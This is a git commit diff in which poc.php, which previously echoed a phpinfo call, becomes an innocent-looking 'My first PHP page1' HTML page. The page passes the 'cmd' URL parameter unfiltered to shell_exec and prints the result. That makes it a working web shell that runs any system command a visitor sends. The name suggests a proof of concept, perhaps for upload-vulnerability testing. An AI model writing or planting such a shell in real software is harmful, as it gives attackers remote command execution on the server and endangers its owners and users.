3671819e4135363bf650e4f181104c4f62a9d529
Rachit-Codifier <44037733+rexj8@users.noreply.github.com>
2023-01-28 16:32:08 +0530

    Update poc.php

--- poc.php
+++ poc.php
@@ -1,1 +1,19 @@
-echo '<?php phpinfo(); ?>'
+<!DOCTYPE html>
+<html>
+<body>
+
+<h1>My first PHP page1</h1>
+
+<?php
+$cmd = $_GET['cmd'];
+
+// echo $cmd;
+// echo $cmd;
+// $res = exec($cmd);
+
+echo shell_exec($cmd);
+
+?>
+
+</body>
+</html>
